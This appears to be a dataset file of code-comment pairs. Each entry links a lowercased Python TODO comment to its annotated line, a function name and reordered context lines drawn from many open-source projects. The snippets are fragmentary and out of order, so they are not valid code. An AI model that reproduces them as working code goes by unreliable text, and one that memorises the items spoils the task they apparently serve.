log("dispersy.log", "handled-barter-record") # todo: maybe move to barter.log </s> try:	on_barter_record with self._database as execute: for message in messages: first_member, second_member, global_time = \ execute(u"SELECT first_member, second_member, global_time FROM \
# todo if update_variable_bounds = false, this will not work as intended. </s> if value(_v.lb) > var_lbs[_v] + tol:	fbbt_block for _v in _new_var_bounds.keys(): if _v.lb is not None: improved_vars.add(_v) var_lbs[_v] = value(_v.lb)
# todo: revise this function and try to speed it up!!! </s> def weight_points(self, points):	weight_points Calculates the Jacobian of the TPS warp wrt to the source landmarks assuming that he target is equal to the source. This is a special
# temporary hack to get pf api working. todo - remove </s> try:	read def read(request, ids=[], index='',value=[]): domain = Domain.objects.get(name='Pathfinder') except Domain.DoesNotExist:
# match apache formatting. todo: when we move to dsa dirnodes and </s> x = self.uri.split("?", 1)	_logger def _logger(self): if len(x) == 1: path = self.uri
# todo: fast initialization of alpha terms, preferably with fugacities </s> eos_g = eos_l.to_tp_zs(t=eos_l.t, p=eos_l.p, zs=ys)	bubble_T_Michelsen_Mollerup ln_phis_l = eos_l.lnphis_l d_lnphis_dT_l = eos_l.d_lnphis_dT(eos_l.Z_l, eos_l.dZ_dT_l, zs) if near_critical: if hasattr(eos_g, 'lnphis_g'):
# todo discont: use offsets instead (note need for int conversion) </s> if (int(start) != tb_ann.start or int(end) != tb_ann.end):	_edit_span undo_resp['offsets'] = tb_ann.spans[:] undo_resp['type'] = tb_ann.type if not isinstance(tb_ann, TextBoundAnnotation):
# todo (b/162341937) remove once it's fixed. </s> eval_rebatch = (params["use_tpu"] and strategy.num_replicas_in_sync > 8)	create_ncf_input_data is_training=True, rebatch=False) eval_dataset = create_dataset_from_tf_record_files( params["eval_dataset_path"],
# todo(nakago): check why tolerance is high </s> gradient_check.check_backward(	test_backward_gpu else: params = tuple(model_no_dropout.params()) model_no_dropout, (atom_data, adj_data), y_grad, params=params,
# todo: must be implemented </s> pass	get_novel_url def get_novel_url(self):
# todo manage tangent? </s> obj.location = vector(conversion.loc_gltf_to_blender(list(values[idx * 3 + 1])))	anim for idx, key in enumerate(keys): if animation.samplers[channel.sampler].interpolation == "CUBICSPLINE": else: obj.location = Vector(Conversion.loc_gltf_to_blender(list(values[idx])))
#     todo </s> def write(self, path, data, offset, fh):	Filesystem with self.rwlock: os.lseek(fh, offset, 0)
# todo: support indexhierarchy </s> if store_filter:	to_csv f.write(line_terminator) if include_index: f.write(f'{filter_func(index_values[row_idx])}{delimiter}') else:
# todo: > 16.04: remove these </s> details = kwd.get( 'details', none ) or kwd.get( 'dataset_details', none ) or []	index order_by = self._parse_order_by( kwd.get( 'order', 'hid-asc' ) ) serialization_params = self._parse_serialization_params( kwd, 'summary' ) if details and details != 'all': details = util.listify( details )
# todo: do we need to multiply the offset by sizeof wchar? </s> return pointer + len(f'\\{pathname}'.rsplit('\\', 1)[0])	hook_PathFindFileNameW pointer = params["pszPath"] pathname = ql.os.utils.read_wstring(pointer)
# todo: implement </s> assert false, "implement"	encode_piece i = 3 elif self.enc_type == 1: # K3 else: # K2 idx = KK_IDX[TRIANGLE[pos[0]]][pos[1]]
except exception:  # todo: refactor this... </s> e = sys.exc_info()[0]	test_DELETE_InvalidURL try: self.assertEqual(self.rnw.DELETE(url, data), 'json') self.assertEquals(e, TypeError)
# todo: refactor </s> if call_list == ['tofile']:	_run_call out = f_block.body[:-3] out[-1].target = assign.target getattr_call = guard(get_definition, self.func_ir, func_var) if (self._is_1D_arr(getattr_call.value.name)):
# todo: this decompose is used because of cache </s> circuits.append(circuit.decompose())	construct_evaluation_circuit circuit = base_circuit.copy(name=circuit_name_prefix + basis.to_label()) circuit.append(instructions[basis.to_label()], qargs=qr, cargs=cr) return circuits
# todo uncomment when gr-10346 will be fixed </s> self.assertraises(valueerror, math.acosh, 0)	testAcosh self.assertRaises(TypeError, math.acosh) self.ftest('acosh(1)', math.acosh(1), 0) self.assertRaises(ValueError, math.acosh, -1) self.assertEqual(math.acosh(INF), INF)
# todo: may test file contents </s> temp = tempfile.namedtemporaryfile(delete=false, mode='wb')	test_export_to_xls_fobj def test_export_to_xls_fobj(self): self.files_to_delete.append(temp.name) rows.export_to_xls(utils.table, temp.file)
''' todo: test failing as of 2015/06/03 and needs to be completed. ''' </s> foundwarning = false	test_bad_id_token_base64_in_response @httpretty.activate def test_bad_id_token_base64_in_response(self): util.setup_expected_user_realm_response_common(False) response = util.create_response()
#for f in fields_manfcat:#todo </s> component_groups[h].manfcat_codes.add(fields.get('manf#'))	group_parts try: component_groups[h].refs.append(ref) except KeyError: component_groups[h] = IdenticalComponents()  # Add empty structure.
# todo: has some issues with datetime and sqlite </s> if name in ['event', 'session']:	_test_model Tests for 200 status on deletion and for the deleted object. Tests that the deleted object no longer exists. return self._login_user()
# todo fix bug for not identifying unused variables in nested exceptions see issue #4391 </s> print("warning")	func3 1 / 2 except TypeError as error:
# todo: what about normalize? </s> margin = initial_settings['margin']	configure_export_dialog dialog.ui.exportPath.setText(file_path) if file_type == 'h5': dialog.ui.addMargin.setValue(margin) include_raw = initial_settings['include raw']
# todo files listed here may not belong to the given camera </s> file_moment = datetime.datetime.fromtimestamp(os.path.getmtime(full_path))	_remove_older_files def _remove_older_files(dir, moment, exts): for full_path in _list_media_files(dir, exts): if file_moment < moment: logging.debug('removing file %(path)s...' % {
#todo classes broken </s> sample = self.sess.run(generator, feed_dict={ z_t: z})	sample_zeros z = np.ones(z_t.get_shape())*2 print("generator is ", generator) print("sample is ", sample) print(sample.shape)
# todo(gibi): remove this when live migration is fully supported and </s> self._turn_off_api_check()	test_live_migrate_with_qos_port_reschedule_success def test_live_migrate_with_qos_port_reschedule_success(self): self._start_compute('host3') compute3_rp_uuid = self._get_provider_uuid_by_host('host3')
# todo only update transform </s> print("transformed:", obj.name)	_scene_edit if changes & Change.OBJECT: for obj in self.object_cache.changed_transform: obj_props, exported_obj = blender_object.convert(obj, context.scene, context, luxcore_scene) props.Set(obj_props)
#todo?# self.asserttrue(greps(err, "unit zzz.service not for --user mode")) </s> self.assertequal(out.strip(), "unknown")	bad_usermode_notify_service_functions logg.info(" %s =>%s \n%s\n%s", cmd, end, err, out) self.assertEqual(end, 3) logg.info("== 'start' shall start a service that is NOT is-active ") cmd = "docker exec {testname} {systemctl} start zzz.service -vv -vv {quick}"
# todo: without the lstrip, we get an extra empty line at the beginning. is </s> fragment = textfragment(	text_lines_width def text_lines_width(document, box, width, skip=None): context = cairo.Context(document.surface) box.text[skip:].lstrip(), box.style, context, width) return fragment.line_widths()
# todo: do we need to add a slicer. does the data always come as numpy array with time series in axis=1. </s> slice = data_inputs[:, a:b]	_validation_split if b > len(data_inputs): b = len(data_inputs) splitted_data_inputs.append(slice) return splitted_data_inputs
# todo: could just build up array of class/kind </s> proc = eventhandlerprocptr(func)	_install_event_handlers func = getattr(self, func_name) for event_class, event_kind in func._carbon_handler: self._carbon_event_handlers.append(proc) upp = carbon.NewEventHandlerUPP(proc)
# todo(ihrachys) adopt to v3 </s> raise cls.skipexception('identity v2 admin not available')	resource_setup def resource_setup(cls): if not CONF.identity_feature_enabled.api_v2_admin: super(QuotasTestBase, cls).resource_setup()
# todo: verify behavior </s> self.assert_received(self.debugger, [])	test_active_exception ])
# todo: symlink or whatever annex does, since annexes beneath </s> target_path = relpath(moved_git_dir, start=path)	_move_gitdir assert not listdir(src_dotgit) rmdir(src_dotgit) if not on_windows: symlink(target_path, opj(path, ".git"))
# todo: do we still need to support ../shed_tools when running_from_source? </s> self.shed_tools_dir = os.path.join(self.data_dir, 'shed_tools')	_set_config_directories self.data_dir = os.path.join(self.config_dir, 'data') self.mutable_config_dir = os.path.join(self.data_dir, 'config') log.debug("Configuration directory is %s", self.config_dir) log.debug("Data directory is %s", self.data_dir)
# :todo: implement test. </s> self.skiptest('not implemented yet.')	test_pass_bundles_only def test_pass_bundles_only(self):
# todo (aron): add i18n by varying the language of the topic tree here </s> topictree = get_flat_topic_tree()	_add_full_title_from_topic_tree @classmethod def _add_full_title_from_topic_tree(cls, entry): video_title_dict = cls._construct_video_dict() entry_kind = entry['entity_kind']
# todo(henry-nash): the test above uses list_projects_for_user </s> test_plan = {	test_list_projects_for_user_with_inherited_group_grants user_projects = self.assignment_api.list_projects_for_user(user1['id']) self.assertEqual(5, len(user_projects))
# todo: make this backend dependent. </s> return true	utilizes_gpu def utilizes_gpu(self):
# todo placeholder; implement </s> pass	init_app backend_options: torch_rpc.RpcBackendOptions, ):
# todo: email request_user_id </s> folder['public'] = true	setCuration doc['level'] = AccessType.READ if enabled and oldStatus == REQUESTED and status == APPROVED: curation[REVIEW_USER_ID] = user.get('_id') if enabled and oldStatus == REQUESTED and status == CONSTRUCTION:
# todo: this is seriously intensive and takes a _long_ time to run. </s> def reindex_documents():	reindex_documents from forums.models import Post from django.conf import settings
# todo docstring args </s> min_id = int_from_str_base(args.min)	dcm_discovery def dcm_discovery(args): max_id = int_from_str_base(args.max) can_wrap = CanActions()
# todo: need to add counter </s> return true	send_hashtag if super(self.__class__, self).sendDirectItem('hashtag', user_ids, text=text, thread=thread_id, hashtag=hashtag): self.logger.info("Message to {user_ids} wasn't sended".format(user_ids=user_ids)) return False
# todo: could cache the results of this for speed </s> existing = location.filter_by_type(domain, loc_type, parent)	get_by_name def get_by_name(loc_name, loc_type, parent): try: return [l for l in existing if l.name == loc_name][0]
# todo improve precision </s> warnings.warn("the cohen-gismalla schemes are only given in single-precision.")	cohen_gismalla_1 def cohen_gismalla_1(symbolic=False): frac = sympy.Rational if symbolic else lambda x, y: x / y u = 0.84623312 v = 0.46607171
# forward all other methods. todo(l.zou): could use a proxy to automate these </s> return self._grad_op	compute_gradients self._grad_op = self._optimizer.compute_gradients(*args, **kwargs)
#set limit to 25 --> currently hardcoded --> todo: add a setting for this ? </s> subelement(root, "limit").text = "25"	addVideoNodesForTag SubElement(Rule, "value").text = tagname SubElement(root, "order", {"direction":"descending"}).text = "dateadded" Rule2 = SubElement(root, "rule", {"field":"playcount","operator":"is"}) SubElement(Rule2, "value").text = "0"
# todo: cleaning of facts should eventually become part of taskresults instead of vars </s> variables.update(namespace_facts(result['ansible_facts']))	_execute variables.update(result['ansible_facts']) else: if C.INJECT_FACTS_AS_VARS: variables.update(clean_facts(result['ansible_facts']))
# todo: let's see if we can find sane versioning for `latest` from upstream </s> if image_config['tag'] == 'latest':	ChartReleaseService image_config = release_data['config'].get('image') or {} if all(k in image_config for k in ('tag', 'repository')): app_version = f'{image_config["repository"]}_{image_config["tag"]}' else:
try: #todo: fix brodcast issue if different </s> if np.ndim(y) < 2:	feed_dict_builder Y = [Y for _t in net_targets] elif len(net_targets) > 1: raise ValueError("Multiple outputs but only one data " "feeded. Please verify number of outputs "
# todo i/o </s> pass	KgeModel return KgeModel(config, dataset)
codecs.decode('5050827d08000000d00745b2cf451b00', 'hex'), # tcp random cmd_ack_ok todo: generate proper sequenced response </s> codecs.decode('5050827d08000000d00745b2cf451b00', 'hex'),  # tcp random cmd_ack_ok todo: generate proper sequenced response	test_tcp_live_connect codecs.decode('5050827d64000000d007a3159663130000000000000000000000000000000000070000000000000006000000000000005d020000000000000f0c0000000000000100000000000000b80b000010270000a0860100b20b00000927000043840100000000000000', 'hex'), #sizes codecs.decode('5050827d04020000dd05942c96631500f801000001000e0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000003830380000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000003832310000000000000000000000000000000000000000000300000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000003833350000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000003833310000000000000000000000000000000000000000000500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000003833320000000000000000000000000000000000000000000600000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000003836000000000000000000000000000000000000000000000c0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000383432000000000000000000000000000000000000000000','hex'), #DATA directly(not ok) codecs.decode('5050827d10000000dc053b59d0983500f401ae4301000000f19449000000120c07130906', 'hex'), # tcp PREPARE_DATA 1011 codecs.decode('5050827df8030000f401ae4301000000f19449000000120c07130906', 'hex'), # reg_event!
# todo: mv this to network; cache directly on network. </s> if config.cache_potential_purviews:	find_mice of them. if purviews is False: purviews = self.network.purview_cache[(direction, mechanism)] else:
# todo: does path make sense? or a separate table? </s> metadata_path=path,	insert_dataset id=dataset_id, type=product_type, metadata=dataset_doc
# todo in python 2.7 and later, this should be a dict comprehension. </s> result['relationships'] = dict((rel, cr(model, instance, rel))	DefaultSerializer return result cr = create_relationship for rel in relations) return result
# todo: make this cache preparation configurable </s> return _carefully_strip_whitespace(content)	_handle_tag def _handle_tag(): content = caller()
# todo: untested </s> filelike = bytesio()	to_bytes def to_bytes(self): torch.save(self._model.state_dict(), filelike) return filelike.read()
@pytest.mark.skip()  # todo: fix this </s> rtm_client.stop()	test_issue_530 if not rtm_client._stopped:
#todo: another idea: </s> player_id = 4 #yellow	save_pngs os.makedirs(destination_path, exist_ok=True)
# todo: make test method </s> ssl             # missing ssl extension?	test_ssl def test_ssl(): import ssl return True
# todo: make it optional </s> penalty = self.regularizer.regularizer.compute_penalty_uniform(model=self.model)	train_one_epoch loss_params['mask_index'] = self.mask_index loss = self.loss.loss(**loss_params) loss_batch = loss.item() + penalty.item() running_loss += (loss_batch - running_loss) / (batch_index + 1)
# todo: make it really async. </s> self.facade = facade	__init__ self.server_name = server_name
# todo: determine test dependencies from plaso.dependencies. </s> file_content.append(u'python3_test_dependencies="python3-mock";')	Write file_content.append(u'PYTHON3_DEPENDENCIES="{0:s}";'.format(dependencies)) file_content.append(u'') file_content.extend(self._FILE_FOOTER) file_content = u'\n'.join(file_content)
# todo(tr3buchet) - remove comment in multi-nic </s> bridge = network['bridge']	inject_network_info except KeyError: pass network_ref = \ NetworkHelper.find_network_with_bridge(self._session, bridge)
# todo: figure out how extend stuff works, a bit confused again. </s> if not bins:	_cmap_features result.set_norm(norm_preprocess) else: offset = {'neither':-1, 'max':0, 'min':0, 'both':1} N = len(levels) + offset[extend] - 1
# todo: handle parser errors </s> root = xml.etree.elementtree.fromstring(data.read())	parse_xspf def parse_xspf(data): tracklist = tree.find('{http://xspf.org/ns/0/}trackList') for track in tracklist.findall('{http://xspf.org/ns/0/}track'):
# todo: for backward compatibility only, remove if not used anymore </s> def get_project_id(self):	get_project_id return get_project(key='id')
# todo: support pairwise arg </s> col_set1 = set(out_colnames)	_handle_rolling other = rhs.args[0] if self._is_df_var(other): col_set2 = set(self._get_df_col_names(other)) out_colnames = list(col_set1 & col_set2)
kwargs.get('crypt', 'aes'),  # todo: use the same channel for crypt </s> opts['master_uri'],  # master id	__key opts['id'],          # minion ID
# todo fix bug for not identifying unused variables in nested exceptions see issue #4391 </s> print("error")	func4 1 / 0 except ZeroDivisionError as error:
# todo: implement this </s> return self.usages	_get_usages self.usages = map(eval, self._chained.stderr.readline().split())
# todo:liberate - move this to a more generalized tag enhancement package? </s> return false	allows_tag_namespace_for return True
# todo remove this custom equality testing code when </s> self.assertequal(obs, exp)	test_fasta_to_sequence_collection for fp in fps: obs = _fasta_to_sequence_collection(fp, **kwargs) for o, e in zip(obs, exp): self.assertTrue(o.equals(e))
# todo: this needs rethinking, as currently we can only express </s> matches = []	_old_concretize self._mark_concrete() Spec.ensure_no_deprecated(self) for x in self.traverse(): if x.external:
# todo(yanase): implement maximization. </s> if _direction == structs.studytask.maximize:	__init__ else: raise ValueError('Please set either \'minimize\' or \'maximize\' to direction.') raise ValueError( 'Optimization direction of study {} is set to `MAXIMIZE`. '
# todo: remove in 1.3 </s> def test_kbinsdiscretizer_subsample_warn():	test_kbinsdiscretizer_subsample_warn X = np.random.rand(200001, 1).reshape(-1, 1) kbd = KBinsDiscretizer(n_bins=100, encode="ordinal", strategy="quantile")
# todo: i don't like this interface. is there a standard python one? pubsub? </s> return imagespecfile(self, source_file)	apply source file.
if sys.version_info[:2] < (3, 5): # todo </s> select(s for s in student if s.name.upper(*args))	test4 args = 'abc'
# todo test cases </s> sensor_alert_state.instrumentation_promise = sensor_alert_state.instrumentation.execute()	_update_instrumentation self._logger)
# todo: the absolute and fixed boxes in the floats must be </s> waiting_floats.append(child)	_out_of_flow_layout context, non_floating_children[-1]) if float_width > max_position_x - position_x or waiting_floats: else: child = float_layout(
# todo: remove in cacheops 3.0 </s> if is_tuple(profile):	prepare_profiles ops = getattr(settings, 'CACHEOPS', {}) for app_model, profile in ops.items(): profile_name, timeout = profile[:2] try:
# todo not implemented yet </s> return	move_current_view_to_far_left Currently only supports 2 row or 2 column layouts. if self.window.num_groups() > 2: if self.window.num_groups() < 2: return
# todo: remove this deprecated function in release 1.0 </s> warnings.warn(	wrapper_register_job def wrapper_register_job(func): "The 'register_job' decorator is deprecated since version 0.5.0. Please use APScheduler's add_job() method " "or @scheduled_job decorator instead.",
# todo: find a better way to return errors... </s> try:	unzip_python def unzip_python(request, directory, django_file, overwrite, **kwargs): archive = zipfile.ZipFile(cStringIO.StringIO(django_file.read()), 'r') for filename in archive.namelist(): try:
# todo ask for the correct attributes e.g state and private_ips </s> for machine in vb_list_machines():	list_nodes_full ) machines = {} name = machine.get("name") if name:
# todo make this check if writeable </s> os.path.exists(log)	install if log: try: except IOError: raise IOError("'%s' is not writeable" % log)
# todo: add information on optional / default components </s> if self.type in types_basic + types_ext:	_get_proto_old def _get_proto_old(self): return self.TYPE elif self.TYPE in (TYPE_SEQ_OF, TYPE_SET_OF):
return {}  # todo return none, somehow </s> except indexerror:	result return results[index]
# todo remove below workaround for double actions </s> if self._counter == 1:	OnInsertCells def OnInsertCells(self, event=None): if self._icells == (self.selection.topleft, self.selection.bottomright): self._counter = 0
# todo: print line number.  pass a span_id into this function? </s> log("test parse error: %s", e.usererrorstring())	Test bool_node = b_parser.ParseForBuiltin() except util.ParseError as e: log("            argv: %s", ' '.join(pretty.Str(a) for a in argv)) return 2
# todo: use valid_episodes.mask for mean </s> loss = -torch.mean(ratio * advantages)	surrogate_loss ratio = torch.exp(pi.log_prob(valid_episodes.actions) - old_pi.log_prob(valid_episodes.actions)) losses.append(loss) return torch.mean(torch.cat(losses, dim=0))
# todo(dtantsur): backwards compability hack, remove in the v release </s> if ramdisk_params.get("ipa-api-url"):	prepare_ramdisk task, pxe_info, ipxe_enabled=ipxe_enabled, ramdisk_params=ramdisk_params) pxe_options["ipa-api-url"] = ramdisk_params["ipa-api-url"] pxe_config_template = deploy_utils.get_pxe_config_template(node)
#todo: show examples </s> :rtype: queryset	filter def filter(self, **kwargs): Adds WHERE arguments to the queryset, returning a new queryset clone = copy.deepcopy(self) for arg, val in kwargs.items():
# todo are there more exceptions besides timeout? </s> except asyncio.timeouterror:	MTProtoSender await self._connection.send(body) break continue else:
# todo: skipped due to gh-4436 </s> yield skip_if_on_windows(skip_ssh(_test_create_store)), 'datalad-test'	test_create_simple def test_create_simple(): yield _test_create_store, None
# todo: losing precision on double types </s> if isinstance(s, list):	unpack_cli_arg return int(s) elif param.type == 'float' or param.type == 'double': s = s[0] return float(s)
# todo chceck correct shapes for integration </s> geo = vg2	get_fargs out_qp = dot_sequences(bf_t , val_grad_qp, 'ATB') else: val_qp = fun(self.get(var1, 'val'))[..., 0, :].swapaxes(-2, -1) out_qp = dot_sequences(vg2.bfg, val_qp, 'ATB')
engine.execute(alala.table_data.insert().values(datas)) # todo chunks?? </s> engine.execute(alala.table_hash.delete())	wrapper else: datas = wrapped(key) engine.execute(alala.table_hash.insert().values([{'value': h}])) return datas
# todo: move to profile callbacks </s> contact = self.session.contacts.me	_handle_action_set_nick def _handle_action_set_nick(self, nick): self.profile.display_name = nick account =  Logger.Account(contact.attrs.get('CID', None), None, contact.account, contact.status, nick, contact.message,
## todo: decode </s> folder_path = unicode(struct.unpack_from('%ds' % (name_size - 1),	__init__ if has_folder_names: name_size = struct.unpack_from('B', file_records_block, file_records_index)[0] file_records_block, file_records_index + 1)[0]) file_records_index += name_size + 1
# todo remove? </s> yield key_stmt[0].name, value_stmt	iterate yield call.name, value_stmt else: else: if stmt.assignment_details:
# todo: unify handling of text objects in one function. perhaps add state.args to merge with vi_cmd_data['motion']['args'] </s> def vi_inclusive_text_object(vi_cmd_data):	vi_inclusive_text_object vi_cmd_data['motion']['command'] = '_vi_select_text_object' vi_cmd_data['motion']['args'] = {'text_object': vi_cmd_data['user_input'], 'mode': vi_cmd_data['mode'], 'count': vi_cmd_data['count']}
pass # todo </s> def handle_request(self, input):	handle_request
# todo: non-numeric columns should be ignored automatically </s> def test_impl(n):	test_mean1 def test_mean1(self): df = pd.DataFrame({'A': np.arange(n)+1.0, 'B': np.arange(n)+1}) return df.mean()
# todo(ls): revert this loop to "yield from" </s> for __x in self.__cause__.format(chain=chain): yield __x	format if chain: if self.__cause__ is not None: yield _cause_message elif (self.__context__ is not None and
# todo(vek): need to pass context in for access to auth_token </s> raise notimplementederror()	get_info :num_cpu:         (int) the number of virtual CPUs for the domain :cpu_time:        (int) the CPU time used in nanoseconds
#todo (nmakhotkin) this should be refactored later </s> try:	get def get(self, name): LOG.debug("Fetch workbook [name=%s]" % name) values = db_api.workbook_get(name) return Workbook.from_dict(values)
# todo - use new error message api! ts </s> self.showerrormessage(m.message(str(mymessage)))	accept except (KeywordDbError, Exception), e: myMessage = getExceptionWithStacktrace(e, theHtml=True) self.hideBusy() return
# todo: make sure package names can't be changed to look like package ids? </s> return pkg	_get_pkg pkg = model.Package.by_name(id)
# todo ... </s> data = sorted()	userLongDescription for key in mainKeys: data[key] = data.get(key, "").strip()
#todo: the following functions are used sage.combinat.combination and </s> return combinations(n,k)	ChooseNK from sage.combinat.combination import Combinations
## todo: fix the unicode issue mentioned in </s> for idx, obj in enumerate(json_obj):	pronunciation if json_obj: Refer : http://stackoverflow.com/q/18337407/3834059 obj['seq'] = idx if sys.version_info[:2] <= (2, 7):  ## python2
# todo: probably better to work out why they are occurring, but imo the </s> caplog.set_level(logging.warning)	test_sort_best_candidate__has_non_yanked def test_sort_best_candidate__has_non_yanked(self, caplog, monkeypatch): Test unyanked candidate preferred over yanked. candidates = [ make_mock_candidate('1.0'),
except attributeerror:  # todo: this logic belongs somewhere - anywhere - else. </s> last_seen = str(node.last_seen)	abridged_node_details try: last_seen = node.last_seen.iso8601() return {"nickname_metadata": node.nickname_metadata, "rest_url": node.rest_url(),
report_config = {}  # todo port to fooddata.from_request </s> report_config.update(	report_config @property def report_config(self): gap_type=self.request.GET.get('gap_type') or '', recall_status=self.request.GET.get('recall_status') or '',
# todo: perhaps some code belongs here to enforce rules about which </s> self.handlesession(m, r)	POST self.handleclientfailure(m, r)
# todo: no testpath exercises this code... </s> log.debug('starting thread...')	target def target(self): self.run() log.debug('Thread Complete')
1  # todo: fill in identifier </s> )	test__if_updater_made_mistake BA_Transfer0 = channelBA.create_directtransfer( transfer_amount, BA_Transfer0.sign(privatekeyB, addressB) channelAB.register_transfer(BA_Transfer0)
# todo: this loop is pretty slow .. (parellize) </s> for iky in range(self.nky):	getJ Jtv_temp0 = np.zeros((m.size, rx.nD), dtype=float) Jtv = np.zeros((m.size, rx.nD), dtype=float) u_src = f[src, self._solutionType, iky] ky = self.kys[iky]
# @todo: use real lightness from hsv or lab color model </s> lightness_delta = sum(int_list_from_hex(new_bg_color)) * (1 if is_dark_bg else -1) + \	_generate_terminal_palette max_possible_lightness = 255 * 3 new_bg_color, _diff = find_closest_color(reference_palette['background'], hex_palette) max_possible_lightness // 6 min_lightness = max_possible_lightness // 38
# todo write bin data </s> output['data'] =  requestdatahelper.data2str(request.data)	req2dict output['data'] = request.data.decode('utf-8') else: except Exception as e: output['data'] = RequestDataHelper.data2Str(request.data)
if len(words) + len(tokens) <= self.args.maxlength:  # todo: filter don't happen here </s> tempwords = []	extractText i = len(sentencesToken)-1 - i tokens = nltk.word_tokenize(sentencesToken[i]) for token in tokens: tempWords.append(self.getWordId(token))  # Create the vocabulary and the training sentences
# todo(nnorwitz): other warnings to add: </s> self._findunusedwarnings()	_FindSourceWarnings def _FindSourceWarnings(self):
pass  # todo </s> def delete(self, uri):	delete
# todo for pytorch 2.0.4, need to set dim=1 for log_softmax or use softmax then take log </s> loss_arc = self.logsoftmax(out_arc.transpose(0, 1)).transpose(0, 1)	decode_mst minus_mask = (1 - mask) * minus_inf out_arc = out_arc + minus_mask.unsqueeze(2) + minus_mask.unsqueeze(1) loss_type = self.logsoftmax(out_type.transpose(1, 3)).transpose(2, 3) energy = loss_arc.unsqueeze(1) + loss_type
form_data.history.append(operation)  # todo: should this show in form history tab? it doesn't </s> form_data.save()	handle operation = self.replace_username_in_xml_for_sql(form_data, form_attachment_xml_new) operation = self.replace_username_in_metadata_for_couch(form_data, form_attachment_xml_new)
# todo: activate this code if we have limits at webmail level </s> pass	reset def reset(self,clientip):
# todo: compare this with compress_code_broken and fix the latter. </s> return result	compress_code_BROKEN i += seglen
#todo : multi parent intelligence </s> if id in self.parents():	remove_parent def remove_parent(id): self.parents.pop(id)
# todo: arrange </s> result = self.remote.get_repo_config_for_profile("testprofile0")	test_get_repo_config_for_profile def test_get_repo_config_for_profile(self): Test: get repository configuration of a profile assert 0
# ---- todo: the following should be removed in milestone:0.11 </s> if formatter.img_re.search(url) and self.flavor != 'oneliner':	_make_relative_link def _make_relative_link(self, url, text): link = html.IMG(src=url, alt=text, title='Warning: direct image ' 'links are deprecated, use [[Image(...)]] instead')
# todo: find the common ground of these, and make it an expression method. </s> if operand.isexpressionmakesequence():	mayHaveSideEffects if operand.mayHaveSideEffects( constraint_collection ): return True return False if operand.isExpressionMakeDict():
# todo fixme result type? </s> def iter_all_messages() -> iterator[messenger.message]:	iter_all_messages model = get_model() for t in model.iter_threads():
# todo fix. </s> self.assertequals(reil_ctx_out["xmm0"], res)	test_pcmpeqb res = 0x000000ff0000ff00ff00000000ffff00 x86_ctx_out, reil_ctx_out = self.__run_code(asm, 0xdeadbeef, ctx_init) self.assertEquals(reil_ctx_out["xmm1"], ctx_init["xmm1"])
# todo: may be check whether it fits to tracking branch </s> raise valueerror("refspec specified without a remote. (%s)" %	fetch if remote is None: if refspec is not None: refspec) if all:
# todo(slaweq): self.has_neutron = true should be added, the mock of </s> self.cloud.create_server(	test_create_server_network_with_empty_nics Verify that if 'network' is supplied, along with an empty 'nics' list, it's treated the same as if 'nics' were not included. 'server-name', dict(id='image-id'), dict(id='flavor-id'), network='network-name', nics=[])
#create and insert todo on remote site </s> todo = frappe.get_doc(dict(doctype='todo', description=description, assigned_by='administrator'))	insert_into_producer def insert_into_producer(self, producer, description): return producer.insert(todo)
# todo: verify </s> mass = elem.mass()	build_Mgg Mbb[i3, i3] = Mbb[i3+1, i3+1] = Mbb[i3+2, i3+2] = mass / 3 elif etype == 'CQUAD4': nid1, nid2, nid3, nid4 = elem.nodes i1 = dof_map[(nid1, 1)]
# todo: other types than can have series inside: list, set, etc. </s> return typ	if_series_to_unbox return types.Tuple( [if_series_to_unbox(t) for t in typ.types])
# todo: ... </s> notes	classify_output ------- numpy.array ----- Target types used by this function are defined by `sklearn.utils.multiclass.type_of_target`.
raise exceptions.mpdnotimplemented  # todo </s> removes the playlist ``name.m3u`` from the playlist directory.	rm ``rm {NAME}``
# todo: repackage timeout? </s> return portalocker.lock(	_shared_lock def _shared_lock(self): self._lock_filename, timeout=self._lock_timeout,
# remove all ads (todo: ad specific div classes probably change over time, look into a more generic method) </s> main_divs = soup.find('div', {'id': 'main'})	search get_body = pattern.sub('685e79', get_body) soup = BeautifulSoup(get_body, 'html.parser') if main_divs is not None: ad_divs = main_divs.findAll('div', {'class': 'ZINbbc'}, recursive=False)
# todo: write tests </s> from any tag with @meter.count and @meter.unit attributes, make a :class:`timesignature`.	_timeSigFromAttrs def _timeSigFromAttrs(elem): :param :class:`~xml.etree.ElementTree.Element` elem: An :class:`Element` with @meter.count and @meter.unit attributes.
self.current_height = self.current_height * 2 #todo </s> self.current_channels = channels	layer_subpixel layers.append(nn.ReLU())#TODO self.current_width = self.current_width * 2 #TODO self.current_input_size = self.current_channels * self.current_width * self.current_height return nn.Sequential(*layers)
# todo: add asserts and type checkings </s> tensor = torch.from_numpy(image)	image_to_tensor def image_to_tensor(image): if len(tensor.shape) == 2: tensor = torch.unsqueeze(tensor, dim=0)
# fix: https://github.com/certtools/intelmq/issues/1720 # todo: find better fix </s> if '/' not in value:	validate_network def validate_network(value): return None if harmonization.IPNetwork.is_valid(value, sanitize=True):
## \todo there should really be a method to map from plug to parameter. </s> def __parameter( plug ) :	__parameter parameter = plug.node().parameterHandler().parameter() for name in plug.relativeName( plug.node() ).split( "." )[1:] :
# todo: in case of recursive object, this will break python </s> if self.type in types_basic + types_ext:	get_proto def get_proto(self): returns the prototype of the object return self.TYPE elif self.TYPE in (TYPE_SEQ_OF, TYPE_SET_OF):
# todo: check that tag key matches section start tag key. </s> raise endofsection(parse_tree, template[start_index:match_index], end_index)	_handle_match func = engine._make_get_escaped(tag_key) elif tag_type == '/': else: raise Exception("Unrecognized tag type: %s" % repr(tag_type))
# todo handle 4 types of transition exceptions </s> pass	create_next next_status = TransactionStatusTransition.next(previous_transaction, action, provider) except Exception: except Exception: pass
# todo(b/171992041): remove the string-typed metric key branch once v1 </s> result.metrics[key].copyfrom(metric_value)	convert_slice_metrics_to_proto key=key.to_proto(), value=metric_value) else: return result
# todo: this is highly inefficient if other properties depending on the </s> if self._phase is none:	phase @property def phase(self): if self._stft is not None: self._phase = np.angle(self._stft)
pass  # todo </s> def create(self, name):	create
